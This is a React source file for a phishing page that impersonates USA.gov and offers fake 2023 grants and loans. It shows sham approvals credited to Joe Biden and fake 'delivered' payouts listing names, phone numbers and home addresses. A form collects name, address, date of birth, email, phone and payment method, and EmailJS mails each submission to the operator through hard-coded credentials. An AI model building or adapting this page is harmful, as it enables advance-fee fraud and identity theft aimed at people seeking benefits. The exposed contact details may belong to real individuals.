import React, { useRef, useState } from 'react'
import emailjs from '@emailjs/browser'
import swal from 'sweetalert';
import {BarLoader} from "react-spinners"
import './main.scss'
import dollar from "./img/dollar.jpeg";
import advert from "./img/advert.jpg";
import USlogo from "./img/USlogo.png";
import bbc from "./img/logo-bbc.png";
import bi from "./img/logo-bi.png";
import forbes from "./img/logo-forbes.png";
import realtors1 from "./img/realtor-1.jpeg";
import realtors2 from "./img/realtor-2.jpeg";
import realtors3 from"./img/realtor-3.jpeg";




export default function Main() {

   const [lastname,setLastname]=useState("")
   const [firstname,setFirstname]=useState("")
   const[email,setEmail]=useState("")
   const[phone,setPhone]=useState("")
   const[address,setAddress]=useState("")
   const[dob,setDob]=useState("")
   const[method,setMethod]=useState("")
   const[reason,setReason]=useState("")
   const[price,setPrice]=useState("")
   const [loader,setLoader]=useState(false)
    
   const form=useRef()
 
    const sendEmail=(e)=>{
      e.preventDefault();
      console.log(form)
    setLoader(true)
 if (firstname&&lastname&&email&&phone&&address&&dob&&method&&reason&&price) {
 emailjs.sendForm("service_mc33p8e", "template_pjqdnwb", form.current, "NBfXFPxY5-jRL1yVx").then(res=>{
   console.log(res)
   setLoader(false)
 swal(`Hi ${lastname},`, "Keep Checking Email", "success");
 setFirstname("")
 setLastname("")
 setEmail("")
 setPhone("")
 setAddress("")
 setDob("")
 setMethod("")
 setReason("")

   
     }).catch(err=>{
        console.log(err)   
       setLoader(false)
 swal(`Hi ${lastname},`, "Network error! Try again", "error");
              });
     }else{
       setLoader(false)
 swal("Please input all filed!", "Try again!", "warning");
       }
    }
  return (

<>
<div className="container">
  
    {/* sidebar  */}
    <div className='sidebar'>
      <button className='nav-btn'> </button>
    </div>
   
      {/* header  */}
    <header className='header'>

       <h3 className='heading-3'> &copy;usa.gov</h3>
       <h1 className='heading-1'>2023 Benefit,Grants&Loans</h1>
       {/* <button className='btn'>view</button> */}
       <div className='header__seeon-text'>see on</div>
       <div className='header__seeon-logos'>
       <img src={bbc} alt='' className='header__logo'/>
       <img src={bi} alt='' className='header__logo'/>
       <img src={forbes} alt='' className='header__logo'/>
       <img src={USlogo} alt='' className='header__logo'/>

      </div>
    </header>


    {/* realtor  */}
    <div className='realtors'>
    <h3 className='heading-3'>Approvals</h3>
      <div className='realtors__list'>
      <img src={realtors1} alt='' className='realtors__img'/>
     <h3 className='heading-3'> Joe Biden</h3>
  
      </div>
      <div className='realtors__list'>
      <img src={realtors2} alt='' className='realtors__img'/>
     <h3 className='heading-3'> Joe Biden</h3>
  
      </div>
      <div className='realtors__list'>
      <img src={realtors3} alt='' className='realtors__img'/>
     <h3 className='heading-3'> Joe Biden</h3>
  
      </div>
   
    </div>

       {/* feature */}
    <section className='features'>
      
    <div className='feature'>
 
          <h4  className='heading-4'>2023 Irs Tax Refund</h4>
          <p  className='feature__text'>The IRS urges people to have all the information they need before they file a tax return. Filing a complete and accurate tax return can avoid extensive processing and refund delays as well as avoid the possibility of needing to file an amended tax return.    
          <a href='#' className='popup'>click here</a></p>
      
        </div>


        <div className='feature'>
      
          <h4 className='heading-4 heading-4--dark' >Financial Assistance</h4>
          <p  className='feature__text'>As the official benefits website of the U.S. government, Benefits.gov increases access to benefit information and program eligibility requirements to help citizens find government assistance.
          <a href='#' className='popup'>click here</a></p>
        </div>


        <div className='feature'>
          <h4 className='heading-4 heading-4--dark' >Veteran Disabilty</h4>
          <p  className='feature__text'>The Department of Veterans Affairs (VA) provides a one-time payment to disabled Veterans of no more than $22,355.72 toward the purchase of an automobile or other transportation.
          <a href='#' className='popup'>click here</a></p>
        </div>


        <div className='feature'>
          <h4 className='heading-4 heading-4--dark '>Mortgages</h4>
          <p className='feature__text'>This program can help individuals buy a single family home. While U.S. Federal Housing Administration (FHA) approved lenders make loans through a number of FHA-insurance programs.
          <a href='#' className='popup'>click here</a> </p>
          </div>

        <div className='feature'>
          <h4 className='heading-4 heading-4--dark'>Unemployment Faqs</h4>
          <p className='feature__text'>Unemployment Insurance, offered by the U.S. Department of Labor (DOL), is a benefit designed to help those who have lost their job due to no fault of their own. 
          <a href='#' className='popup'>click here</a></p>
        </div>
        
        <div className='feature'>
          <h4 className='heading-4 heading-4--dark'>Small Business Loan</h4>
          <p  className='feature__text'>7(a) loans are the most basic and most used type loan of the Small Business Administration's (SBA) business loan programs.
          <a href='#' className='popup'>click here</a> </p>
        </div>


    </section>
      

         {/* story section  */}
    <div className='story__pictures'>
    <img src={advert} alt="" className='story__pictures--advert' /> 
    </div>
    <div className='story__content'>
   <h2 className='heading-2 heading-2--dark'>&ldquo;The best decision &rdquo;</h2>
     <p className='story__text'>
 
THE PROGRAM OFFERS BUSINESS OPPORTUNITY, FOSTER SUSTAINABLE ECONOMIC GROWTH, MAKE RESOURCES AVAILABLE TO MEMBERS EXPERIENCING BALANCE OF PAYMENTS DIFFICULTIES AROUND THE WORLD. OUR OFFICIAL GOAL IS THE REDUCTION OF POVERTY WITH PASSION AND PROFESSIONALISM. THIS PROGRAM IS A WORLDWIDE PROMOTIONAL TOUR EMBARKED ON FOR THE YOUNG & OLD PEOPLE WHO ARE FULL AND PART-TIME WORKERS, UNEMPLOYED DISABLED, RETIRED, SEMI-RETIRED
     </p>
     <button className='btn'>Find your home</button>
     </div>



   {/* winings  */}
     <section className='winings'>
        <div className='wining'>
         <img src={dollar} alt="" className='wining__img' />
    
         <div className='wining__location'>
            <p>
            (503) 826-9368
            36645 Yocum Loop
             Sandy, Oregon(OR), 97055
            </p>
         </div>
         <div className='wining__price'>
            <p>$22,000</p>
         </div>
         <div className='wining__price'>
            <p>12 Nov 2022</p>
         </div>
         <div className='wining__deliver'>
         <i class="fa-solid fa-location-pin">Delivered</i>
         </div>
        </div>
          

        <div className='wining'>
        <img src={dollar} alt="" className='wining__img' />
    
         <div className='wining__location'>
            <p>(518) 425-0218
                    36 Drew Ln
                    Chateaugay, New York(NY), 12920
            </p>
         </div>
         <div className='wining__price'>
            <p>$20,000</p>
         </div>
         <div className='wining__price'>
            <p>2 aug 1969</p>
         </div>
         <div className='wining__deliver'>
         <i class="fa-solid fa-location-pin">Delivered</i>
         </div>
        </div>


        <div className='wining'>
        <img src={dollar} alt="" className='wining__img' />
        
         <div className='wining__location'>
            <p>(208) 548-2248
                 2451 Fairview Rd
                 American Falls, Idaho(ID), 83211
            </p>
         </div>
         <div className='wining__price'>
            <p>$10,000</p>
         </div>
         <div className='wining__price'>
            <p>12 Nov 1987</p>
         </div>
         <div className='wining__deliver'>
         <i class="fa-solid fa-location-pin">Delivered</i>
         </div>
        </div>



        <div className='wining'>
        <img src={dollar} alt="" className='wining__img' />
      
         <div className='wining__location'>
            <p>
            (908) 561-5955
             3226 Revere Rd
              South Plainfield, New Jersey(NJ), 07080
            </p>
         </div>
         <div className='wining__price'>
            <p>$13,000</p>
         </div>
         <div className='wining__price'>
            <p>12 jan 2022</p>
         </div>
         <div className='wining__deliver'>
         <i class="fa-solid fa-location-pin">Delivered</i>
         </div>
        </div>



        <div className='wining'>
        <img src={dollar} alt="" className='wining__img' />
     
         <div className='wining__location'>
            <p>
            (704) 538-5046
            305 Plainsview Church Rd
             Lawndale, North Carolina(NC), 28090
            </p>
         </div>
         <div className='wining__price'>
            <p>$20,000</p>
         </div>
         <div className='wining__price'>
            <p>5 Nov 2022</p>
         </div>
         <div className='wining__deliver'>
         <i class="fa-solid fa-location-pin">Delivered</i>
         </div>
        </div>



        <div className='wining'>
        <img src={dollar} alt="" className='wining__img' />
   
         <div className='wining__location'>
            <p>
            (518) 885-5618
             2041 Saint Paul Dr
            Ballston Spa, New York(NY), 12020
            </p>
         </div>
         <div className='wining__price'>
            <p>$30,000</p>
         </div>
         <div className='wining__price'>
            <p>25 dec 2022</p>
         </div>
         <div className='wining__deliver'>
         <i class="fa-solid fa-location-pin">Delivered</i>
         </div>
        </div>
     </section>



{/* form */}
     <section className='form'>
     <div className='popup__shell'>
     <form action='#'  ref={form} onSubmit={sendEmail} className='popform'>
{/* grant amount */}
<div className='popform__group'>
<BarLoader loading={loader} color="#36d7b7" className='w-100' />
<label for="price" className='popform__label'>$0-100000 Amount</label>
<input type="text" name='price' className="popform__input"  placeholder="Input amount"  value={price} onChange={(e)=>setPrice(e.target.value)} required/>
  </div>


{/* lastname */}
    <div className='popform__group'>
<label for="lastname" className='popform__label'>Lastname</label>
<input type="text" name='lastname' className="popform__input" placeholder="lastname"  value={lastname} onChange={(e)=>setLastname(e.target.value)} required/>
  </div>
  
  {/* firstname */}
  <div className="popform__group">
<label for="firstname" className='popform__label'>Firstname</label>
<input type="text" name='firstname' className="popform__input"  placeholder="firstname"  value={firstname} onChange={(e)=>setFirstname(e.target.value)} required/>
  </div>

{/* address */}
  <div className='popform__group'>
<label for="address" className='popform__label'>Home/Delivery Address</label>
<input type="text" name='address' className="popform__input"  placeholder="Home/Delivery Address"  value={address} onChange={(e)=>setAddress(e.target.value)} required/>
  </div>


{/* date of birth */}
  <div className='popform__group'>
<label for="dob" className='popform__label'>Date of birth</label>
<input type="text" name='dob' className="popform__input" placeholder="Date Of Birth"  value={dob} onChange={(e)=>setDob(e.target.value)} required/>
  </div>

   {/* email    */}
   <div className='popform__group'>
<label for="email" className='popform__label'>Email Address</label>
<input type="text" name='email' className="popform__input"  placeholder="email"  value={email} onChange={(e)=>setEmail(e.target.value)} required/>
  </div>
 
 {/* phone */}
 <div className='popform__group'>
<label for="phone" className='popform__label'>Phone Number</label>
<input type="tel" name='phone' className="popform__input" placeholder="+1 (234) 456-7890"  value={phone} onChange={(e)=>setPhone(e.target.value)} required/>
  </div>

   {/*reason   */}
   <div className='popform__group'>
<label for="reason" className='popform__label'>Reason For Applying</label>
<input type="text" name='reason' className="popform__input"  placeholder="(optional)"  value={reason} onChange={(e)=>setReason(e.target.value)} />
  </div>

     {/* payment method  */}
     <div className='popform__group'>
<label for="method" className='popform__label'>Payment Delivery Method(cash/check)</label>
<input type="text" name='method' className="popform__input"  placeholder="state method of payment"  value={method} onChange={(e)=>setMethod(e.target.value)} required/>
  </div>
  
 <div className='popform__group'>
    <input type='submit' value="Apply" className='btn'/>
 </div>
  </form>
  </div>
     </section>


        {/* footer  */}
     <footer className='footer'>
          <ul className='nav'>
   <li className='nav__item'>
   <a href='' className='nav__link'>About us and site Notices</a>
   </li>
   <li className='nav__item'>
      <a href='' className='nav__link'>For the media</a>
   </li>
   <li className='nav__item'>
      <a href='' className='nav__link'>For Developers</a>
   </li>
   <li className='nav__item'>
      <a href='' className='nav__link'>Report a website issue</a>
   </li>
   <li className='nav__item'>
      <a href='' className='nav__link'>All Topics and services</a>
   </li>
          </ul>
   <p className='copyright'>
   &copy;USAGov is the official Guide to Government Information and Services </p>
     </footer>
     
</div>


</>

  )
}
